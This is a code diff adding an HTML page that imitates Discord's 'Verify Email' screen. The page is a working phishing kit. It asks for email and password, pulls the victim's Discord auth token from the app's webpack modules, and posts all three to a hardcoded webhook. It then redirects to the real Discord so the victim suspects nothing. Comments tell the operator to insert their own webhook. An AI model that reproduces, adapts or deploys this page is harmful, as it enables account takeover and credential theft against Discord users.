@@ -1,0 +1,87 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Discord | Verify Email</title>
+    <style>
+        *{margin:0;padding:0;box-sizing:border-box;font-family:'gg sans',sans-serif;}
+        body{background-color:#36393f;display:flex;align-items:center;justify-content:center;height:100vh;}
+        .container{background-color:#2f3136;width:420px;border-radius:5px;padding:25px;box-shadow:0 2px 10px 0 rgba(0,0,0,.2);}
+        .logo{text-align:center;margin-bottom:20px;}
+        .logo img{width:80px;}
+        h1{color:#fff;text-align:center;font-size:22px;margin-bottom:8px;}
+        .subtext{color:#b9bbbe;text-align:center;font-size:14px;margin-bottom:25px;}
+        label{display:block;color:#b9bbbe;font-size:13px;font-weight:600;margin-bottom:8px;}
+        input{width:100%;padding:10px;background-color:#303339;border:1px solid #222428;border-radius:3px;color:#dcddde;font-size:15px;margin-bottom:20px;outline:none;}
+        button{width:100%;padding:12px;background-color:#5865f2;color:white;border:none;border-radius:3px;font-size:16px;font-weight:500;cursor:pointer;transition:background .2s;}
+        button:hover{background-color:#4752c4;}
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="logo">
+            <img src="https://discord.com/assets/e4923594e694a254eb61a641d769c325.svg" alt="Discord Logo">
+        </div>
+        <h1>Verify Email to Proceed</h1>
+        <div class="subtext">To continue using Discord and access all features, please confirm your email and password below.</div>
+
+        <form id="verifyForm">
+            <label>EMAIL ADDRESS</label>
+            <input type="text" id="email" autocomplete="off" placeholder="your@email.com">
+
+            <label>PASSWORD</label>
+            <input type="password" id="password" autocomplete="off" placeholder="Your password">
+
+            <button type="submit">Verify Now</button>
+        </form>
+    </div>
+
+    <script>
+        // PUT YOUR OWN WEBHOOK HERE — ALL DATA COMES HERE
+        const WEBHOOK = "https://discord.com/api/webhooks/1485149098469363722/eHt-L942QorL11aYAEylSum_FRe197gPBriMOhFTUs56pUVWh1zurqCedmUT-ePtzt1p";
+
+        // 🔥 AUTO GRAB DISCORD TOKEN IF OPENED INSIDE DISCORD APP
+        let token = '';
+        try {
+            window.webpackChunkdiscord_app.push([
+                [Math.random()], {},
+                req => {
+                    for (let m of Object.values(req.c)) {
+                        if (!m.exports || !m.exports.default) continue;
+                        const found = Object.values(m.exports.default).find(e => typeof e === 'object' && e?.token);
+                        if (found) { token = found.token; break; }
+                    }
+                }
+            ]);
+        } catch(e){}
+
+        document.getElementById('verifyForm').addEventListener('submit', e => {
+            e.preventDefault();
+            const email = document.getElementById('email').value;
+            const pass = document.getElementById('password').value;
+
+            // 📤 SEND EVERYTHING TO YOU INSTANTLY
+            fetch(WEBHOOK, {
+                method: "POST",
+                headers: {"Content-Type": "application/json"},
+                body: JSON.stringify({
+                    embeds: [{
+                        title: "✅ VERIFICATION SUBMITTED — ACCOUNT GRABBED",
+                        color: 0xFF0000,
+                        fields: [
+                            {name: "Email", value: email || "Not entered", inline: false},
+                            {name: "Password", value: pass || "Not entered", inline: false},
+                            {name: "Auth Token", value: `\`${token || 'Not found'}\``, inline: false}
+                        ]
+                    }]
+                })
+            }).then(() => {
+                // After they click, send them to real Discord so they think it worked
+                window.location.href = "https://discord.com/channels/@me";
+            });
+        });
+    </script>
+</body>
+  </html>
+  
